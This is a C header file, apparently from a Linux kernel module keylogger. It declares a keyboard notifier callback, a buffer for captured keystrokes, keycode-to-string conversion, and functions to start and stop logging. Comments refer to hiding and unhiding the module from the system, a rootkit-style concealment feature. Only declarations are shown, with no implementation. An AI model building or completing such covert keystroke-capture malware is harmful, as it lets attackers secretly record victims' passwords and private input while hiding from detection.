#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_
#include "fops.h"
#include "keys.h"
#define DEVICE_NAME "Keylogger"
/*vars for makeing files*/
/*########*/
int ret = 0;
int len;

/*Vars for keystroke & strings save*/
extern char msg_Ptr[BUFF_SIZE];
extern size_t buf_pos;

/*Vars for the charcater devices*/
/*
struct cdev *mcdev;
struct cdev *mcdev1;
int major_number;
dev_t dev_num;
dev_t dev_num1;

struct fake_device
{
    char data[100];
    struct semaphore sem;

};
struct fake_device virtual_device, virtual_device1;*/

/*ret value and hide value*/



/*define the syfs_remove_dir func*/


/*file opersion for hideing and unhide the module*/
/*works by using the open file opersion*/
int keycode_to_string(int key_press, int shift, char* buff);
int notifier(struct notifier_block* block, unsigned long code, void* p);
static struct notifier_block keylogger = { .notifier_call = notifier };
int run_keylogger(void);
void stop_keylogger(void);

#endif